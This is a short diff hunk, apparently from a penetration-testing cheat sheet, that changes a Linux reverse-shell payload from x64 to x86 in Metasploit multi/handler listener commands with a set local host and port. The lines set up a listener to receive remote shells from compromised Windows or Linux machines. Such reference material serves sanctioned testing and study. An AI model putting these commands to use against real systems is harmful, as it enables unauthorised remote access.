@@ -45,7 +45,7 @@ msfconsole
 use exploit/multi/handler
 set PAYLOAD windows/shell/reverse_tcp
 OR
-set PAYLOAD linux/x64/shell/reverse_tcp
+set PAYLOAD linux/x86/shell/reverse_tcp
 set LHOST 192.168.0.1
 set LPORT 4242
 run
